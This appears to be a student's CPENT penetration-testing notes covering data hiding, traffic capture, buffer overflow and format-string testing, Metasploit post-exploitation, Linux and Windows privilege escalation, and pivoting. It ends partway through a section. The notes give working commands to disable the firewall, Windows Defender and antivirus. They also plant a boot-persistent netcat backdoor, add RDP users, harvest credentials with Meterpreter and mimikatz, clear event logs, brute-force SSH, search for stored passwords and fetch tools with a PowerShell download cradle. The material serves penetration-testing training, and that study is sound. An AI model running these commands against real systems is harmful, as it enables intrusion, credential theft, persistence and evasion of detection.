![image-20210826155313028](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826155313028.png)

#### Hide Sensitive Data on Target Machines

Hiding sensitive data prevent other users from reading the file and identifying key information. You can hide data on the target machine. The following data items should be hidden on target machines:

- **IP addresses**: An IP address is a unique Internet identifier for a local or a remote system connected to the Internet.

- **Source code**: This is the piece of code written by a developer in a high-level language. This code gets converted into machine code after compilation. To prevent this code from getting copied and being misused, it is a good idea to hide the source code.

- **Pictures**: Hide all pictures that carry sensitive information on the system and also hide photographs to prevent morphing, and so on.

- **Word documents and spreadsheets**: Word documents and spreadsheets that carry various details, particulars, and other sensitive information should also be hidden.

You can use tools such as Free Hide Folder and WinMend to hide the files and folders.

##### Free Hide Folder

Source: http://www.cleanersoft.com
It is a free computer security software used to hide private folders and personal data away from others. You can use this tool on the target machine to hide the personal data  of the victim and lock it away from him to access.

**Key features:**

- It hides the folder completely; nobody can view or find it unless it is unhide.
- It provides password protection when running a program.
- No need of files system structure modifications.
- Easy to use and user friendly.
- User can hide any number of folders at the same time.

![image-20210826155814434](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826155814434.png)

#### Use Various Steganography Techniques to Hide Files on Target Machines

With steganography, sensitive information can be hidden in images and text. This can prevent the easy recognition of vital files. Attempt to hide information in images and simple text files. You can use tools like QuickStego Software and SNOW to perform steganography. Load the image into QuickStego (or QuickCrypto) and the secret text that was hidden in the photograph. 

##### QuickStego

Source: http://quickcrypto.com

QuickStego lets you hide secret messages in images so that only other users of QuickStego can retrieve and read them. Once you hide a secret message in an image, you can still save it as picture file; it will load just like any other image and appear just as before. The user can save, email, and upload the image to the web, and the only difference will be that it contains hidden message.

Features:

- Conceals information in folders, images, and sounds
- Keeps all online and offline passwords safe
- Recovers deleted files on NTFS and FAT systems
- Prevents recovery of sensitive files (even already deleted)
- Removes temporary and audit files
- Views and shreds Internet browser tracing files
- Tests passwords and attempt password recovery
- Monitors system for potential security flaws

It is simple to hide the confidential text in the image, first open the tool, and select the image of your wish to add secret message or text. After selecting the image, type the message at the right side of the image as shown below. After that, click on Hide Text and then on the Save Image. The image will be saved with .BMP bitmap extension. Now, this file will contain both image and message but the message cannot be seen. The
receiver needs to load the image on QuickStego to reveal the secrete message.

![image-20210826160221281](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826160221281.png)

#### Capture Communications between FTP Client and FTP Server

FTP enables clients to share files between computers over the Internet. But this protocol fails to provide encryption, so you can sniff data easily as well as user credentials by running tools. You can use tools like FTP traffic to capture the communications between an FTP client and an FTP server. FTP traffic capture (ftp_capture.acp) records the results of communication between an FTP client and an FTP server.

Another way to capture the FTP traffic is by using the actual ports. By default, the FTP port listens on port no 20 and 21. You can capture the traffic by using Wireshark tool, type the following filter string in the filter bar and press Enter. 

tcp.port==20 or tcp.port==21

![image-20210826160441758](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826160441758.png)

#### Capture HTTPS Traffic (Even though it cannot be Decoded)

Capture HTTPS traffic (even though it cannot be decoded). IE HTTP analyzer is a utility that allows you to capture HTTP/HTTPS traffic in real time.

##### IE HTTP Analyzer

Source: https://www.ieinspector.com
IE HTTP Analyzer is a useful developer tool used for debugging, performance analysis, and diagnostic. It can be integrated into the IE or Firefox browsers in Windows and easily accessed from the IE or Firefox toolbar. It is used to capture the HTTP/HTTPS traffic in real time and allows to trace and display information regarding the Cookies, Content, Header, Post data, Query String, Request and Response team, URLs, and so on. Also, it provides cache information, HTTP status code information, and session clearing information. This tool has a request builder that allows to handcraft a HTTP/HTTPS request.

Some basic steps of HTTP analyzer:

- First, launch the new IE window and click on the HTTP analyzer icon in the IE toolbar to open it.
- Enter the URL in the address bar of IE to navigate to it. And enter “test post” in the test edit and click “submit post.”
- Click on the “start logging” to capture the HTTP traffic.
- The HTTP analyzer’s session grid displays the entries. In case if HTTP analyzer band is closed, then it will stop logging the requests.
- Click on any entry in the Session Grid; it will display a detailed information of individual HTTP session in the Session view.

![image-20210826160852432](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826160852432.png)

#### Spoof the MAC Address

Spoof the MAC address and get access to VLANs.

##### SMAC

Source: http://www.klcconsulting.net
SpoofMAC (SMAC) is a powerful, easy-to-use, and intuitive MAC address—changing (spoofing) tool for Windows systems. SMAC is a MAC address changer that changes MAC addresses for any Virtual PC, VMs, or Windows systems. It does not rely on the hardware address on the NIC but changes only software-based MAC addresses. The new MAC addresses sustain reboots. It features MAC address lookup. It displays either all or only active network adapters and randomly generates new MAC addresses or those based on a selected manufacturer. It also restores the original MAC address by removing the spoofed MAC address. SMAC discovers information about NIC that includes device ID, active status, NIC description, NIC manufacturer, spoofed status (Yes/No), IP address, active MAC addresses, spoofed MAC address, NIC hardware ID, NIC configuration ID, and so on.

![image-20210826161145261](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826161145261.png)

#### Poison the Victim’s IE Proxy Server

Poison the victim’s IE proxy server settings and redirect them to rogue servers. You can add a bogus proxy server to IE’s Internet settings by using the following steps:

- In IE, go to Tools and then Internet Options.
- On the Connections tab, click the LAN settings button.
- In the resulting dialog box, select the following check box in the Proxy server section:
  Use a proxy server for your LAN (These settings will not apply to dial-up or VPN connections).
- For example, enter 127.1.1.1 in the Address text box.
- Enter 8080 in the Port text box and click OK.

![image-20210826161416400](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826161416400.png)

#### Test for Stack Overflow Vulnerability using OllyDbg Debugger

When a program or process tries to put more data to a fixed block of buffer than the buffer is allocated to hold, then the buffer overflow occurs. There are two types of buffer flows:

* Stack-based

* Heap-based

For performing stack-based buffer overflow attacks, you can attempt to overwrite the stack   registers and can also modify the variables present in stack intentionally. As a penetration   tester, you can test the target machine for any stack-based buffer overflow vulnerabilities and   exploit if found one. You can use debugging tools to identify and analyze buffer overflows.

Steps that are to be followed to test for stack overflow vulnerability using OllyDbg Debugger:

- Attach a debugger to the target application for process.

- Generate malformed input for the application.

- Subject the application to malformed input.

- Insert response in a debugger.

For example, given below is a sample executable application “sample.exe,” that is vulnerable to stack overflow attack. To test for buffer overflow attack, you can perform the following steps:

**Step 1**: Testing “sample.exe” for stack overflows.

Analyze the source code of the application and try to identify if there is any loophole or vulnerability present in the code

Following is the source code for sample.exe file:

```
#include<stdio.h>
int main(int argc, char *argv[])
{
char buff[20]; printf("copying into buffer") ;
strcpy (buff, argv[1]); return 0;
}
```

In the above source code, you can observe that this code requires input arguments while executing in real time and this code consists of an invalid strepy command which is vulnerable to stack overflow attacks.

**Step 2**: Launch “sample.exe” in a debugger.
To ensure your observation from step 1, open the sample.exe file using OllyDbg debugger.

**Step 3**: Because this application requires input argument from the user, attempt to supply a large sequence of characters such as “A” in the Argument field as shown in below figure.

![image-20210826162045000](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826162045000.png)

**Step 4**: Click Open in the debugger to the executable with the supplied arguments (AAAAAAAA...) and continue execution. The result is shown in the below figure.

**Step 5**: OllyDbg debugger opens up and after the execution of the executable file, you can observe that the execution will be halted and in the Registers box, EIP register field contains the value “41414141,” which represents the hexadecimal “AAAA.” This means that the stack instruction pointer is also filled up with the supplied A’s and now the instruction pointer is pointing to a location 41414141 which does not exist, causing the application to crash.

![image-20210826162255279](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826162255279.png)

#### Test for Format String Vulnerability using IDA Pro

Format string vulnerability is simply due to the coding error, where the programmer makes a mistake of improper usage of commands like printf and sprint that allows the user to provide input arguments directly to buffers. This improper usage can enable user to input any number of input arguments and can lead to buffer overflow attacks. Format string vulnerabilities are most often exploited within web servers, application servers, web applications utilizing C/C++ based code, and CGI scripts written in C. A sample format string vulnerable code is mentioned in the below figure.

![image-20210826162627466](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826162627466.png)

As a penetration tester, try to identify the presence of a format string vulnerability by checking instances of code (assembly fragments). When the disassembly is examined using IDA Pro, the address of a format type specifier being pushed on the stack is clearly visible before a call to print is made. Try to manipulate input parameters to include %x or %n type specifies. 

For example, a legitimate request like:
http://hostname/cgi-bin/query.cgi?name=john&code=45765

is changed into:

http://hostname/cgi-bin/query.cgi?name=john%x.%x.%x&code=45765%Xx.%Xx

![image-20210826162842651](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826162842651.png)



#### Automated Internal Network Penetration Testing Tool: Metasploit

Source: https://www.metasploit.com
The Metasploit Framework is a penetration testing toolkit, exploit development platform, and research tool that includes hundreds of working remote exploits for a variety of platforms. It is an exploit development tool that is used for writing, testing, and using exploit code in an open-source platform. It provides a concrete platform for penetration testing, shell code development, and vulnerability research. Metasploit is written in Ruby and runs on Windows, Linux, BSD, and Mac OS X. It includes the following features:

- Supports various networking options and protocols to develop protocol-dependent code.

- Includes tools and libraries to support features such as debugging, encoding, logging, timeouts, and SSL.

- Presence of supplementary exploits to help in testing of exploitation techniques and sample exploits produced.

There are three work environments for the installed MSF. They are the msfconsole, the msfcli interface, and the msfWeb interface. The primary and most resourceful work area is the msfconsole, which is a command-line interface. It helps you to verify vulnerabilities and manage security assessments.

![image-20210826163146174](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826163146174.png)

#### Automated Internal Network Penetration Testing Tool: Immunity CANVAS

Source: http://www.immunitysec.com
CANVAS is an automated exploitation system and a comprehensive, reliable exploit development framework for security professionals and penetration testers. Canvas, developed by the Immunity software team, is a security tool written in Python. Canvas is an inclusive exploitation framework that casts vulnerability information into practical exploits. The main focus of this tool is on creative debugging, that is, working with unexpected behaviors caused by software bugs and making them reliable.

Support Platforms and Installations:

- Linux
- MacOsSx it requires PyGTK
- Windows it requires Python and PyGTK
- Other Python environment such as mobile phones and commercial Unixes with command line version are only supported, and it may be available for GUI

![image-20210826163435932](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826163435932.png)

![image-20210826163502379](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826163502379.png)

## Post Exploitation

After the exploitation, as a penetration tester, there are certain mandatory activities that you need to perform like resetting the original configurations, deleting installed backdoors, and checking for missing patches. As a penetration tester, you are also responsible to provide recommendations to the client based on the penetration test results.

### You got a shell! Now what?

1. Crack passwords
2. Escalate privileges if required
3. Plant backdoor — if allowed by scope
4. Conduct local assessment

### Disable the Firewall

- The local firewall can cause challenges, so best to disable it

  ```
  netsh firewall set opmode disable
  ```

  ![image-20210826164032642](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826164032642.png)

### Disable Windows Defender

```
net stop “Windows Defender Antivirus Network Inspection Service”
```

```
net stop “Windows Defender Antivirus Service”
```

````
net stop “Windows Defender Security Center Service”
````

- Depending on the operating system and your level of access, the commands might not all work

### Kill Antivirus

- killav script

![image-20210826182138485](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826182138485.png)

#### Local Assessment

- **Ipconfig/ifconfig**
  (learn the internal addressing)

- **Ping**
  (limit to remain stealthy)

- **Nslookup**
  (look at the dns data)

- **Nbtstat**
  (locating machines of interest) (domain controllers)

- **netstat —ano (connections)**

  - Linux

    - **netstat -vauptn**

    - **lsof**

- **arp -a**
  (machines that are reachable)

- **Windows net commands**

  (locating shares and disabling protections)

- **ftp and tftp**

  (bring in your additional tools)

- **telnet**

  (banner grabbing in the local intranet)

- **Check for utilities**

  (especially in Linux)

- **Route Print**

  This will display the routing table of our computer;
  the **netstat -r** command can also be used for this

- **tasklist/svc**

  Running services

- **Netsh**

  ```
  netsh firewall set opmode disable
  ```

#### Meterpreter Post Exploitation

**Powerful scripts**

- **enumdesktops**

  Prints information about all the running desktops

- **migrate**
  Can migrate to a more stable and higher privilege process

- **getsystem**
  Will attempt to escalate privileges by all methods available

- **bypassuac**
  Will attempt to bypass UAC — fails on newer Windows machines

- **incognito**
  Valid impersonation token of a specific user, say, administrator, to impersonate that user without any authentication

- **list_tokens -u**
  List the available tokens for impersonation

#### Install a Backdoor

If allowed in the scope, install netcat

1. First kill the antivirus

   ```
   killav
   ```

2. ```
   upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32
   ```

   ![image-20210826183649112](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826183649112.png)

   

#### Setup the Backdoor at Boot cP

```
reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -d 'C:\windows\system32\nc.exe -Ldp 4444 -e cmd.exe' -v netcat
```

![image-20210826183959753](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826183959753.png)

![image-20210826184032748](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826184032748.png)

#### Windows Target

**Enable remote desktop**

```
run getgui -e
```

**Add users for rdp**

```
run getgui -u kevin -p pass
```

![image-20210826184234297](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826184234297.png)



#### Testing our Access

```
rdesktop -u username -p password [IP Address]
```

![image-20210826184416970](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826184416970.png)

#### Grab the Data

```
run winenum
```

![image-20210826184501998](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826184501998.png)

#### Grab the Credentials

```
run post/windows/gather/credentials/credential_collector
```

![image-20210826184621144](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826184621144.png)

#### View the Recent Files

```
run post/windows/gather/dumplinks
```

![image-20210826184733094](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826184733094.png)

### Installed Applications

```
run post/windows/gather/enum_applications
```

![image-20210826184842647](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826184842647.png)



#### Asked for Exploit Suggestions

```
run post/multi/recon/local_exploit_suggester
```

![image-20210826185003215](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826185003215.png)

#### Usb hostory

- Display the usb information of the compromised box

```
run post/windows/gather/usb_history
```

![image-20210826185133876](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826185133876.png)

#### Event Manager Information

- Display the information about the event viewers

```
run event_manager -i
```

![image-20210826185300071](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826185300071.png)

#### Event Manager Log Clearing

```
run event_manager -c
```

![image-20210826185403156](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826185403156.png)

#### Mimikatz

1. We can use mimikatz to extract the passwords from our targets as well when hashdump does not work
2. Load mimikatz
3. kerberos

![image-20210827085903609](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210827085903609.png)

#### WMIC Commands

**List processes**

```
wmic process list brief
```

**Start an application** 

```
wmic process call create “calc.exe”
```

**Get list of process identifiers**

```
wmic process where (Name='svchost.exe’) get name, processed
```

**Find a specific Process**

```
wmic process list brief find “cmd.exe”
```

**Collect environment variables** 

```
wmic environment list
```

**OS/System Report HTML Formatted** 

```
wmic /output:c:\os.html os get /format:hform
```

**Turn on remote desktop remotely** 

```
wmic /node:”servername” /user:”user@domain” /password:“password” RDToggle
where ServerName="server name” call SetAllowTSConnections 1
```

**Get startup list**

```
wmic startup list full
```

Collect a list of groups on the local system 

```
wmic group list brief
```

OS/System Report HTML Formatted 

```
wmic /output:c:\os.html os get /format:hform
```

### Escalating Privileges

- When we get the shell we might not be at admin or root level privileges
- We have to escalate our privileges to take more control of the machine
- Techniques we will discuss:
  - Wmic
  - UAC bypass
  - Linux privilege escalation

#### Meterpreter Getsystem Escalation

![image-20210827091243104](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210827091243104.png)

#### Impersonation

- Use incognito

![image-20210827091808589](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210827091808589.png)

#### Tokens

```
list_tokens -u
```

```
impersonate_token machine_name\\Administrator
```

![image-20210827092015928](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210827092015928.png)

#### WMIC

- We can use this to identify the patch level of the compromised machine
  - Windows 7 and later targets

```
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

![image-20210827092253192](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210827092253192.png)

#### WMIC Analysis

- Look at the installed KB numbers and from there analyze any vulnerabilities by using the findstr command

```
wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr "KB2937220"
```

![image-20210827092607875](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210827092607875.png)

- If output is returned, then the patch is installed => have to look for another one

![image-20210827092756703](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210827092756703.png)

#### Exploiting the Finding 

- Once we have the identification that the patch is missing, we next get the exploit from one of the sites we have discussed:
  - Remember, the exploit db is one of the best
  - We discover the exploit there and download it
    - https://www.exploit-db.com/exploits/39719/

![image-20210827093506753](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210827093506753.png)

#### Find with searchploit

![image-20210827093916486](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210827093916486.png)

#### Privilege Escalation with Dirty Cow

1. A local privilege escalation against Linux
2. Once we have a shell, we can attempt to escalate privileges
3. Code is buggy, but sometimes work
4. If you have Ubuntu later than 15.04 then Dirty Cow might be the way to go

![image-20210827094255291](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210827094255291.png)

#### Ubuntu 16.04 Privilege Escalation bpf

```
exploit/linux/local/bpf_priv_esc
```

```
msf6 exploit(linux/local/bpf_priv_esc) > show info

       Name: Linux BPF doubleput UAF Privilege Escalation
     Module: exploit/linux/local/bpf_priv_esc
   Platform: Linux
       Arch: x86, x64
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Good
  Disclosed: 2016-05-04

Provided by:
  jannh <jannh@google.com>
  h00die <mike@shorebreaksecurity.com>

Available targets:
  Id  Name
  --  ----
  0   Linux x86
  1   Linux x64

Check supported:
  Yes

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  COMPILE  Auto             yes       Compile on target (Accepted: Auto, True, False)
  MAXWAIT  120              yes       Max time to wait for decrementation in seconds
  SESSION                   yes       The session to run this module on.

Payload information:

Description:
  Linux kernel 4.4 < 4.5.5 extended Berkeley Packet Filter (eBPF) does 
  not properly reference count file descriptors, resulting in a 
  use-after-free, which can be abused to escalate privileges. The 
  target system must be compiled with `CONFIG_BPF_SYSCALL` and must 
  not have `kernel.unprivileged_bpf_disabled` set to 1. Note, this 
  module will overwrite the first few lines of `/etc/crontab` with a 
  new cron job. The job will need to be manually removed. This module 
  has been tested successfully on Ubuntu 16.04 (x64) kernel 
  4.4.0-21-generic (default kernel).

References:
  http://www.securityfocus.com/bid/90309
  https://nvd.nist.gov/vuln/detail/CVE-2016-4557
  https://www.exploit-db.com/exploits/39772
  https://bugs.chromium.org/p/project-zero/issues/detail?id=808
  https://usn.ubuntu.com/2965-1/
  https://launchpad.net/bugs/1578705
  http://changelogs.ubuntu.com/changelogs/pool/main/l/linux/linux_4.4.0-22.39/changelog
  https://people.canonical.com/~ubuntu-security/cve/2016/CVE-2016-4557.html
  https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=8358b02bf67d3a5d8a825070e1aa73f25fb2e4c7

Also known as:
  double-fdput
  doubleput.c
```

#### Finding Privilege Escalation Attacks

In Parrot

```
searchsploit privilege
```

Match the OS and Kernel to those that are found and try to exploit

![image-20210827095548927](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210827095548927.png)

#### Privilege Escalation up to Ubuntu 15.04

- The escalation of preference is the overlayfs

```
#searchsploit overlayfs
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
Linux Kernel (Ubuntu / Fedora / RedHat) - 'Overlayfs' Local Privilege Escalation (M | linux/local/40688.rb
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Pri | linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Pri | linux/local/37293.txt
Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - 'overlayfs' Local Privilege Escalation (1 | linux/local/39166.c
Linux Kernel 4.3.3 - 'overlayfs' Local Privilege Escalation (2)                     | linux/local/39230.c
OverlayFS inode Security Checks - 'inode.c' Local Security Bypass                   | linux/local/36571.sh
Ubuntu 14.04/15.10 - User Namespace Overlayfs Xattr SetGID Privilege Escalation     | linux/local/41762.txt
Ubuntu 15.10 - 'USERNS ' Overlayfs Over Fuse Privilege Escalation                   | linux/local/41763.txt
Ubuntu 19.10 - ubuntu-aufs-modified mmap_region() Breaks Refcounting in overlayfs/s | linux/dos/47692.txt
------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

##### overlayfs Privilege Escalation

- Available in Metasploit
- Requires access first
  - Common is via brute forcing a service
    - ssh is common

```
use exploit/linux/local/overlayfs_priv_esc
```

```
msf6 exploit(linux/local/overlayfs_priv_esc) > info 

       Name: Overlayfs Privilege Escalation
     Module: exploit/linux/local/overlayfs_priv_esc
   Platform: Linux
       Arch: x86, x64
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Good
  Disclosed: 2015-06-16

Provided by:
  h00die <mike@shorebreaksecurity.com>
  rebel

Available targets:
  Id  Name
  --  ----
  0   CVE-2015-1328
  1   CVE-2015-8660

Check supported:
  Yes

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  COMPILE  Auto             yes       Compile on target (Accepted: Auto, True, False)
  SESSION                   yes       The session to run this module on.

Payload information:

Description:
  This module attempts to exploit two different CVEs related to 
  overlayfs. CVE-2015-1328: Ubuntu specific -> 3.13.0-24 (14.04 
  default) < 3.13.0-55 3.16.0-25 (14.10 default) < 3.16.0-41 3.19.0-18 
  (15.04 default) < 3.19.0-21 CVE-2015-8660: Ubuntu: 3.19.0-18 < 
  3.19.0-43 4.2.0-18 < 4.2.0-23 (14.04.1, 15.10) Fedora: < 4.2.8 
  (vulnerable, un-tested) Red Hat: < 3.10.0-327 (rhel 6, vulnerable, 
  un-tested)

References:
  https://www.exploit-db.com/exploits/39166
  https://www.exploit-db.com/exploits/37292
  https://nvd.nist.gov/vuln/detail/CVE-2015-1328
  https://nvd.nist.gov/vuln/detail/CVE-2015-8660
```

##### Search by Kernel

```
#searchsploit linux kernel 2.6 privilege
```

![image-20210827105529621](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210827105529621.png)

#### Initial Access

- Brute force a ssh login is the most common method

  - Hydra

    We have covered this

  - Metasploit

    - Auxiliary scanner

      ```
      auxiliary/scanner/ssh/ssh_login
      ```

```
msf6 auxiliary(scanner/ssh/ssh_login) > info

       Name: SSH Login Check Scanner
     Module: auxiliary/scanner/ssh/ssh_login
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  todb <todb@metasploit.com>

Check supported:
  No

Basic options:
  Name              Current Setting  Required  Description
  ----              ---------------  --------  -----------
  BLANK_PASSWORDS   false            no        Try blank passwords for all users
  BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
  DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
  DB_ALL_PASS       false            no        Add all passwords in the current database to the list
  DB_ALL_USERS      false            no        Add all users in the current database to the list
  PASSWORD                           no        A specific password to authenticate with
  PASS_FILE                          no        File containing passwords, one per line
  RHOSTS                             yes       The target host(s), range CIDR identifier, or hosts file with syntax
                                               'file:<path>'
  RPORT             22               yes       The target port
  STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
  THREADS           1                yes       The number of concurrent threads (max one per host)
  USERNAME                           no        A specific username to authenticate as
  USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per
                                               line
  USER_AS_PASS      false            no        Try the username as the password for all users
  USER_FILE                          no        File containing usernames, one per line
  VERBOSE           false            yes       Whether to print output for all attempts

Description:
  This module will test ssh logins on a range of machines and report 
  successful logins. If you have loaded a database plugin and 
  connected to a database this module will record successful logins 
  and hosts so you can track your access.

References:
  https://nvd.nist.gov/vuln/detail/CVE-1999-0502
```

- Brute force a user via ssh
- Enter the correct details and run the attact

![image-20210827110352616](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210827110352616.png)

#### Overlayfs Exploit

![image-20210827111024210](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210827111024210.png)

#### Search for Data in Windows Shell

```
dir /s *pass* == *cred* == *vnc* == *.config*
```

![image-20210827112717633](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210827112717633.png)

#### Search for Specific Data

- Look for a password file

  ```
  findstr /si password *.xml *.ini *.txt
  ```

  ![image-20210827115218389](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210827115218389.png)

#### Search in Registry

```
reg query HKLM /f password /t REG_SZ /s
```

```
reg query HKCU /f password /t REG_SZ /s
```



#### Unatttended Files

![image-20210827120044153](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210827120044153.png)

#### Other Files of Interest

- Services\Services.xml
- ScheduledTasks\ScheduledTasks.xml
- Printers\Printers.xml
- Drives\Drives.xml
- DataSources\DataSources.xml

#### Linux Privilege Escalation

Determine the kernel version

```
uname -a
```

Return additional information about the machine

```
cat /etc/lsb-release
```

![image-20210827120427017](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210827120427017.png)

#### Shell Limited?

- Try and spawn a bash shell

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

```
echo os.system('/bin/bash')
```

```
/bin/sh -I
```



#### Sticky Bits

Only the owner of the directory or the owner of a file can delete or rename

```
find / -perm -1000 -type d 2>/dev/null
```

 SGID (chmod 2000) - run as the group, not the user who started it

```
find / -perm -g=s -type f 2>/dev/null
```

SUID (chmod 4000) - run as the owner, not the user who started it

```
find / -perm -u=s -type f 2>/dev/null
```



#### Written to and Executed From

```
find / -writable -type d 2>/dev/null
```

```
find / -perm -222 -type d 2>/dev/null
```

**world-writeable folders**

```
find / -perm -o w -type d 2>/dev/null
```

**world-executable folders**

```
find / -perm -o x -type d 2>/dev/null
```

**world-writeable & executable folders**

```
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
```



#### Dev Tools

What development tools are on the compromised machine

- find / -name perl*
- find / -name python*
- find / -name gcc*
- find / -name cc



#### File Transfer 

If we have a meterpreter shell then we can transfer files, if not then we need to find what is available

- find / -name wget
- find / -name nc*
- find / -name netcat*
- find / -name tftp*
- find / -name ftp

#### User/Group Account Script

With a for loop in the Windows command shell, we can combine wmic and net user to get extended information about all the users on the system

```
for /F "skip=1" %i in ('wmic useraccount get name') do net user %i >> users.txt
```

Groups

```
for /F "delims=* tokens=1 skip=4" %i in ('net localgroup') do net localgroup %i >> groups.txt
```

#### Powershell Script to Transfer a File 

1. Start the web server on Kali

   ```
   service http2 start
   
   ```

2. ```
   echo $client = New-Object System.Net.WebClient > script.psl
   ```

3. Replace the IP with your Kali machine

   ```
   $targetlocation = http://192.168.177.102/PsExec.exe
   ```

4. ```
   $client.DownloadFile($targetlocation,"psexec.exe")
   ```

5. Execute the script

   ```
   powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script.psl
   ```



#### Checking Missing Security Patches and Patch Levels: Linux

- Unlike Microsoft Windows, Linux platform doesn't provide regular patch cycle management
- Linux and UNIX users have to wait for the release of patches related to vulnerabilities identified
- Run Linux/UNIX Patch Auditing services provided by Nessus to detect missing patches in Linux/Unix systems

![image-20210827184914356](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210827184914356.png)

### Cleanup: Resetting into Prevision State

Resetting the system to the original state is important after the successful completion of penetration testing. After successful exploitation and recording its proof of concept, you should reverse the target system into previous state.

It may include activities like:

- Removing from a target system all executable, scripts, temporary files, user accounts that were installed and used during exploitation.
- Resetting system settings and configuration, if modified.
- All backdoors and rootkits installed are to be removed.

## Advance Tips and Techniques

### Pivoting

- We will encounter networks that are not visible from our attacking machine
- We will need to exploit a machine that is dual homed and connected to another network
- This reaching new networks from the original or first victim is known as pivoting

### Trust

Once we compromise the first victim, we improve our position within the network. The results of compromising the first victim are:

- Having direct routing to the new victims
- Store usernames and passwords
- Allow for footprinting, enumeration and compromising of new victims

### Dual Homed Machine

![image-20210827190241967](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210827190241967.png)

#### Preparation

- Dual homed machines are common
- Have a plan for when you encounter the machines
- The longer the attack is ongoing, the higher the risk of detection
- Imperative that the attack is scripted as much as possible
  - Saves time and avoids typos
- Remember your scope of work
  - Off limits areas and Rules of Engagement

### New Attack

- Routing will be required

- The victim machine will not have the exploits and payloads that you need to attack the next network and or machine
- Three methods for the attack
  - Download the utilities to the victim and run from the shell
  - Port forwarding
  - Session routing

### Run from the Shell

- We have shown how we can do this with the upload command in Meterpreter
- Alternatively we can ftp or tftp the code over and then install it
- Have to disable protections in most cases
- Least desired method

### Port Forwading

- Redirect connection for a port on the first victim to another host
- Useful when:
  - We have a firewall still between the first compromise and the inside net
  - Direct routing to the first victim is available
  - Source of the attack is now the address of the first victim and not us

### Session Routing

Attacker sets up routing to send attacks through the initial victim and on to the next ones

- The attacks are in effect tunneled to the first victim
- Source address of new attacks Is the first victim
- Initial victim acts as an exploit proxy 

**Session Routing Diagram**

![image-20210827191140392](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210827191140392.png)

### Pivoting in Action

- Exploit machine with two network cards

![image-20210829062911759](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210829062911759.png)

### We have to Add the Route

In Meterpreter this is easy:

- run autoroute -h
- run autoroute -s 192.168.40.0
- run autoroute -p

### Search the Discovered Network

- Can use a variety of post modules in Metasploit

![image-20210829063509264](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210829063509264.png)

### OS Discovery

- Windows or Samba

- An smb_version discovery scanner

  ```
